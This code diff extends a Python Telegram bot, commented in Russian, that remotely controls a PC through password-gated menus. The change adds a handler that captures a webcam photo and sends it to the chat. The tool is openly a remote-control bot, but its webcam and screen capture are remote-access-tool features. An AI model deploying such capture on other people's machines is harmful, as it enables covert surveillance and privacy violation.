@@ -1,4 +1,5 @@
-import os, sys
+import os
+import sys
 import telebot
 import tempfile
 from PIL import ImageGrab
@@ -10,6 +11,7 @@ from PIL import Image, ImageDraw
 import psutil
 import platform
 import socket
+import cv2
 
 
 API_TOKEN = 'токен бота'
@@ -31,6 +33,7 @@ def check_password(message):
         markup.add("Свернуть все окна")
         markup.add("Написать сообщение")
         markup.add("Инфо о пк")
+        markup.add("Сделать фото с веб-камеры")
         bot.send_message(message.chat.id, 'Привет! Выберите действие:', reply_markup=markup)
     elif password == 'пароль уровня доступа 2':
         markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
@@ -40,6 +43,7 @@ def check_password(message):
         markup.add("Свернуть все окна")
         markup.add("Написать сообщение")
         markup.add("Инфо о пк")
+        markup.add("Сделать фото с веб-камеры")
         bot.send_message(message.chat.id, 'Привет! Выберите действие:', reply_markup=markup)
     elif password == 'пароль уровня доступа 3':
         markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
@@ -50,6 +54,7 @@ def check_password(message):
         markup.add("Свернуть все окна")
         markup.add("Написать сообщение")
         markup.add("Инфо о пк")
+        markup.add("Сделать фото с веб-камеры")
         markup.add("Выключить да")
         bot.send_message(message.chat.id, 'Привет! Выберите действие:', reply_markup=markup)
     else:
@@ -154,15 +159,25 @@ def open_link(message):
     if not (parsed_url.scheme and parsed_url.netloc):
         bot.send_message(message.chat.id, 'Это не похоже на ссылку.')
         return
-    excluded_domains = [ 'сайт которій хотите запретить', 'сайт которій хотите запретить' ] # мжет работать не коректно
+    excluded_domains = ['сайт которій хотите запретить', 'сайт которій хотите запретить'] # мжет работать не коректно
     if any(parsed_url.netloc.lower().endswith(domain) for domain in excluded_domains):
         bot.send_message(message.chat.id, 'Извините, но открытие ссылок на некоторые домены запрещено.')
     else:
         bot.send_message(message.chat.id, f'Открываю ссылку: {url}')
         webbrowser.open(url)
 
-
-        
+@bot.message_handler(regexp='сделать фото с веб-камеры')
+def take_photo(message):
+    bot.send_message(message.chat.id, 'Делаю фото с веб-камеры...')
+    cap = cv2.VideoCapture(0)
+    ret, frame = cap.read()
+    if ret:
+        path = tempfile.gettempdir() + 'webcam_photo.png'
+        cv2.imwrite(path, frame)
+        bot.send_photo(message.chat.id, open(path, 'rb'))
+    else:
+        bot.send_message(message.chat.id, 'Не удалось получить доступ к веб-камере.')
+    cap.release()
 
 
 bot.infinity_polling()
